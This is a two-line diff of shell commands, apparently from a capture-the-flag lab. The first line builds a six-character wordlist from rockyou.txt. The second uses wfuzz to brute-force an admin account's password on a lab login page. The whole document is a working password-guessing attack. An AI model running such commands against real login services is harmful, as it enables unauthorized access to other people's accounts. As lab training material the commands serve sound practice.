@@ -1,0 +1,2 @@
+grep -E '^.{6}$' /usr/share/wordlists/rockyou.txt > words.txt
+wfuzz -z file,words.txt -d "email=adminaccount@itsupport.thm&password=FUZZ" --hc 401 http://10.10.204.247/login
